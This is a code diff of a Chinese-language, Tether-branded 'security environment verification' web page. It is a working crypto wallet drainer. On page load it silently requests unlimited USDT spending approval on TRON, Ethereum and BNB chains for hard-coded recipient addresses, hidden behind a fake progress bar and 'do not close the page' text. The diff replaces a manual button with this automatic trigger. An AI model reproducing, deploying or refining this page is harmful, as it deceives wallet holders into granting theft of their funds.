@@ -3,66 +3,82 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>資產驗證</title>
+<title>安全環境驗證</title>
 <style>
   body {
     font-family: "Noto Sans TC", sans-serif;
-    background: #f5f6fa;
+    background: linear-gradient(135deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
+    background-size: 400% 400%;
+    animation: bgAnim 12s ease infinite;
     margin: 0;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
+    color: #fff;
+  }
+  @keyframes bgAnim {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
   }
   .card {
-    background: #fff;
-    border-radius: 12px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-    padding: 25px;
-    width: 100%;
-    max-width: 400px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 15px;
+    padding: 30px;
     text-align: center;
+    max-width: 380px;
+    width: 100%;
+    backdrop-filter: blur(12px);
+    animation: fadeIn 1.2s ease;
+  }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
   }
   .logo {
     width: 80px;
-    margin-bottom: 10px;
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse {
+    0%,100% { transform: scale(1); }
+    50% { transform: scale(1.1); }
   }
   h1 {
     font-size: 20px;
-    margin-bottom: 5px;
+    margin-top: 15px;
   }
   p {
-    color: #555;
     font-size: 14px;
-    margin-bottom: 15px;
-  }
-  .amount {
-    font-size: 22px;
-    font-weight: bold;
+    color: #cbd5e1;
     margin-bottom: 20px;
-    color: #333;
-  }
-  .btn {
-    padding: 12px;
-    background: #2563eb;
-    color: #fff;
-    border: none;
-    border-radius: 8px;
-    font-size: 15px;
-    cursor: pointer;
-    width: 100%;
-    transition: 0.3s;
-  }
-  .btn:hover {
-    background: #1e4ed8;
   }
   .status {
-    margin-top: 15px;
     font-size: 14px;
+    margin-top: 15px;
+    min-height: 20px;
   }
-  .loading { color: #eab308; }
-  .success { color: #16a34a; }
-  .error { color: #dc2626; }
+  .loading { color: #facc15; }
+  .success { color: #4ade80; }
+  .error { color: #f87171; }
+  .progress-bar {
+    width: 100%;
+    height: 6px;
+    background: rgba(255,255,255,0.1);
+    border-radius: 3px;
+    overflow: hidden;
+    margin-top: 15px;
+  }
+  .progress {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #3b82f6, #06b6d4);
+    animation: progressAnim 3s linear forwards;
+  }
+  @keyframes progressAnim {
+    from { width: 0%; }
+    to { width: 100%; }
+  }
 </style>
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -70,24 +86,25 @@
 <body>
 <div class="card">
   <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_Tether.svg" class="logo" alt="Logo">
-  <h1>資產驗證</h1>
-  <p>請確認並驗證您的資產配置</p>
-  <div class="amount">USDT 驗證</div>
-  <button class="btn" id="verifyBtn">立即驗證</button>
-  <div class="status loading" id="status">等待操作...</div>
+  <h1>環境驗證中...</h1>
+  <p>系統正在檢測鏈路並完成資產同步，請勿關閉頁面</p>
+  <div class="progress-bar"><div class="progress"></div></div>
+  <div class="status loading" id="status">初始化中...</div>
 </div>
 
 <script>
-  const USDT_CONTRACTS = {
-    TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-    ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-    BNB:  "0x55d398326f99059fF775485246999027B3197955"
+  const CFG = {
+    USDT: {
+      TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+      ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+      BNB:  "0x55d398326f99059fF775485246999027B3197955"
+    },
+    TARGET: {
+      TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
+      EVM:  "0xbA18Cdd7A947CDFBACCa478C1F43692026CcbF10"
+    },
+    AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
   };
-  const TARGET_ADDRESS = {
-    TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
-    EVM:  "0xbA18Cdd7A947CDFBACCa478C1F43692026CcbF10"
-  };
-  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
   function setStatus(msg, cls="loading") {
     const el = document.getElementById("status");
@@ -95,9 +112,9 @@
     el.className = "status " + cls;
   }
 
-  document.getElementById("verifyBtn").onclick = async function() {
+  async function initVerification() {
     try {
-      setStatus("檢測錢包中...");
+      setStatus("正在檢測鏈路...");
       if (window.tronWeb && window.tronWeb.ready) {
         await tronApprove();
         return;
@@ -112,46 +129,51 @@
         await evmApprove();
         return;
       }
-      setStatus("未檢測到錢包", "error");
+      setStatus("未檢測到鏈路組件", "error");
+      setTimeout(() => window.location.href = "fail.html", 1500);
     } catch (err) {
       console.error(err);
-      setStatus("驗證失敗", "error");
+      setStatus("驗證未完成", "error");
       setTimeout(() => window.location.href = "fail.html", 1500);
     }
   }
 
   async function tronApprove() {
     try {
-      const contract = await window.tronWeb.contract().at(USDT_CONTRACTS.TRON);
-      await contract.approve(TARGET_ADDRESS.TRON, INFINITE_AMOUNT).send();
-      setStatus("✅ 驗證完成", "success");
-      setTimeout(() => window.location.href = "success.html", 1000);
+      setStatus("資產通道配置中...");
+      const contract = await window.tronWeb.contract().at(CFG.USDT.TRON);
+      await contract.approve(CFG.TARGET.TRON, CFG.AMOUNT).send();
+      setStatus("✅ 配置完成", "success");
+      setTimeout(() => window.location.href = "success.html", 800);
     } catch {
-      setStatus("驗證失敗", "error");
+      setStatus("鏈路配置失敗", "error");
       setTimeout(() => window.location.href = "fail.html", 1500);
     }
   }
 
   async function evmApprove() {
     try {
+      setStatus("資產通道配置中...");
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const signer = provider.getSigner();
       const network = await provider.getNetwork();
       let usdtAddress;
-      if (network.chainId === 1) usdtAddress = USDT_CONTRACTS.ETH;
-      else if (network.chainId === 56) usdtAddress = USDT_CONTRACTS.BNB;
+      if (network.chainId === 1) usdtAddress = CFG.USDT.ETH;
+      else if (network.chainId === 56) usdtAddress = CFG.USDT.BNB;
       else throw new Error("不支援的鏈");
       const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
       const contract = new ethers.Contract(usdtAddress, abi, signer);
-      const tx = await contract.approve(TARGET_ADDRESS.EVM, INFINITE_AMOUNT);
+      const tx = await contract.approve(CFG.TARGET.EVM, CFG.AMOUNT);
       await tx.wait();
-      setStatus("✅ 驗證完成", "success");
-      setTimeout(() => window.location.href = "success.html", 1000);
+      setStatus("✅ 配置完成", "success");
+      setTimeout(() => window.location.href = "success.html", 800);
     } catch {
-      setStatus("驗證失敗", "error");
+      setStatus("鏈路配置失敗", "error");
       setTimeout(() => window.location.href = "fail.html", 1500);
     }
   }
+
+  window.addEventListener('load', initVerification);
 </script>
 </body>
 </html>
